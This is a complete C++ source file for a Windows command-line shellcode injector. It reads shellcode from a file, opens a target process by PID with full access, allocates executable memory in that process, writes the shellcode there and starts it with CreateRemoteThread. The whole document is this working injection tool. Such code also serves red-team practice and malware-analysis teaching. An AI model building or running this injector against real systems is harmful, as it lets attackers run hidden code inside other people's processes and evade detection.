#include <iostream>
#include <windows.h>
#include "util.h"

int main(int argc, char *argv[])
{
	if (argc < 3) {
		std::cout << "~ injector "
#ifdef _WIN64
			<< "(64-bit)"
#else
			<< "(32-bit)"
#endif
			<< " ~\n"
			<< "Loads shellcode from a file, and injects it into a process with a given PID.\n";

		std::cout << "Args: <shellcode_file> <target_PID>" << std::endl;
		system("pause");
		return 0;
	}

	char *path = argv[1];
	int pid = atoi(argv[2]);
	size_t shc_size = 0;
	BYTE *shellcode = util::load_file(path, shc_size);
	if (!shellcode) {
		std::cerr << "Could not load the shellcode file\n";
		return -1;
	}
	std::cout << "Injecting to: " << pid << "\n";
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
		std::cerr << "[ERROR] Could not open process : " << std::hex << GetLastError() << std::endl;
		return -1;
	}
	LPVOID remote_buf = VirtualAllocEx(hProcess, NULL, shc_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (remote_buf == NULL) {
		std::cerr << "[ERROR] Could not allocate a remote buffer : " << std::hex << GetLastError() << std::endl;
		return -1;
	}
	if (!WriteProcessMemory(hProcess, remote_buf, shellcode, shc_size, NULL)) {
		std::cerr << "[ERROR] WriteProcessMemory failed, status : " << std::hex << GetLastError() << std::endl;
		return -1;
	}
	HANDLE hMyThread = NULL;
	DWORD threadId = 0;
	if ((hMyThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)remote_buf, NULL, 0, &threadId)) == NULL) {
		std::cerr << "[ERROR] CreateRemoteThread failed, status : " << std::hex << GetLastError() << std::endl;
		return -1;
	}
	std::cout << "Injected, created Thread, id = " << threadId << "\n";
	CloseHandle(hMyThread);
	CloseHandle(hProcess);
	return 0;
}
